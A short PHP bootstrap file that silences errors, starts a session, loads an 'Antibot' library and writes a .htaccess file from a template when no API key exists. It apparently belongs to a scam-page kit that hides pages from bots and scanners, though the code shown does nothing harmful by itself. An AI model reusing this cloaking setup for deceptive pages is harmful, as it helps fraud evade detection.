<?php
error_reporting(0);
date_default_timezone_set("Asia/Jakarta");
session_start();
/**
 * @Author: Eka Syahwan
 * @Date:   2018-11-14 15:36:23
 * @Last Modified by:   Nokia 1337
 * @Last Modified time: 2019-09-16 00:03:21
*/
require_once('lib/antibot.php');
$Antibot = new Antibot; 

if(file_exists("htaccess.txt") && !file_exists("api/api.key")){
	file_put_contents(".htaccess", file_get_contents("htaccess.txt"));
}

?>
